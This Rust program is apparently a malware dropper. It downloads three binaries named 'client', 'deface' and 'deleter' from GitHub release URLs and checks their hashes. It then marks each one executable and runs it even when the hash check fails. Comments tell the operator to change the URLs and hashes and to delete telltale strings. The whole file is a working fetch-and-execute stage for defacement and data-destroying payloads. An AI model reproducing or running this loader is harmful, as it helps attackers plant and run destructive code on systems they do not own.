// DELETE EXCESS STRINGS
// CHANGE HASH AND URL

use std::{io::{Cursor, self}, fs, process::Command};
use sha2::{Sha256, Digest};
use hex;

fn shasum(file_path:String) -> String{
    let mut file = fs::File::open(file_path).unwrap();
    let mut hasher = Sha256::new();
    let _n = io::copy(&mut file, &mut hasher).unwrap();
    let hash = hasher.finalize();
    return hex::encode(hash);
}

type Result<T> = std::result::Result<T, Box<dyn std::error::Error + Send + Sync>>;
async fn fetch_url(url: String, file_name: String) -> Result<()> {
    let response = reqwest::get(url).await?;
    let mut file = fs::File::create(file_name)?;
    let mut content = Cursor::new(response.bytes().await?);
    io::copy(&mut content, &mut file)?;
    Ok(())
}

#[tokio::main]
async fn main() {
    // urls
    let client_url:String = "https://github.com/PoggerPussy/poggerpussy.github.io/releases/download/test/test1".to_string();
    let deface_url:String = "https://github.com/PoggerPussy/poggerpussy.github.io/releases/download/test/test2".to_string();
    let deleter_url:String = "https://github.com/PoggerPussy/poggerpussy.github.io/releases/download/test/test3".to_string();
    // hashes
    let client_hash = "2d9498eed8e455e647f1b3d81abd23650ed78560ed6969d4221666f6560b6490".to_string();
    let deface_hash = "fc417b5191afddb1008d0814836500a8a9110db1997e3c72509baddd96f96d5c".to_string();
    let deleter_hash = "034627556433c7b585cc4b3f028d0e617f5c11668a916a44d96309f29dfb5e20".to_string();
    // file paths
    let client_path = "./client".to_string();
    let deface_path = "./deface".to_string();
    let deleter_path = "./deleter".to_string();

    match fetch_url(client_url,"client".to_string()).await {
        Ok(_) => (println!("Downloaded client")),
        Err(e) => (println!("Error: {}", e)),
    };
    match fetch_url(deface_url,"deface".to_string()).await {
        Ok(_) => (println!("Downloaded deface")),
        Err(e) => (println!("Error: {}", e)),
    };
    match fetch_url(deleter_url,"deleter".to_string()).await {
        Ok(_) => (println!("Downloaded deleter")),
        Err(e) => (println!("Error: {}", e)),
    };

    let shasum_client = shasum(client_path.clone());
    let shasum_deface = shasum(deface_path.clone());
    let shasum_deleter = shasum(deleter_path.clone());

    if shasum_client == client_hash {
        println!("Client hash verified: {}", shasum_client);


    } else {
        println!("Client hash failed: {}", shasum_client);
        println!("Expected: {}", client_hash);
    };

    if shasum_deface == deface_hash {
        println!("Deface hash verified: {}", shasum_deface);

    } else {
        println!("Deface hash failed: {}", shasum_deface);
        println!("Expected: {}", deface_hash);
    };

    if shasum_deleter == deleter_hash {
        println!("Deleter hash verified: {}", shasum_deleter);

    } else {
        println!("Deleter hash failed: {}", shasum_deleter);
        println!("Expected: {}", deleter_hash);
    };
    
    println!("{}",client_path);
    //////////////////////////// remove chmod
    //////////////////////////// remove chmod
    //////////////////////////// remove chmod
    //////////////////////////// remove chmod
    //////////////////////////// remove chmod
    //////////////////////////// remove chmod
    //////////////////////////// remove chmod
    //////////////////////////// remove chmod
    //////////////////////////// remove chmod
    let _output_client = Command::new("chmod").arg("+x").arg(client_path.clone())
        .output()
        .expect("failed to execute process");
    let _output_client = Command::new(client_path)
        .output()
        .expect("failed to execute process");
    print!("{}", String::from_utf8_lossy(&_output_client.stdout));
    
    println!("{}",deface_path);
    let _output_deface = Command::new("chmod").arg("+x").arg(deface_path.clone())
        .output()
        .expect("failed to execute process");
    let _output_deface = Command::new(deface_path)
        .output()
        .expect("failed to execute process");
    print!("{}", String::from_utf8_lossy(&_output_deface.stdout));

    println!("{}",deleter_path);
    let _output_deleter = Command::new("chmod").arg("+x").arg(deleter_path.clone())
        .output()
        .expect("failed to execute process");
    let _output_deleter = Command::new(deleter_path)
        .output()
        .expect("failed to execute process");
    print!("{}", String::from_utf8_lossy(&_output_deleter.stdout));
}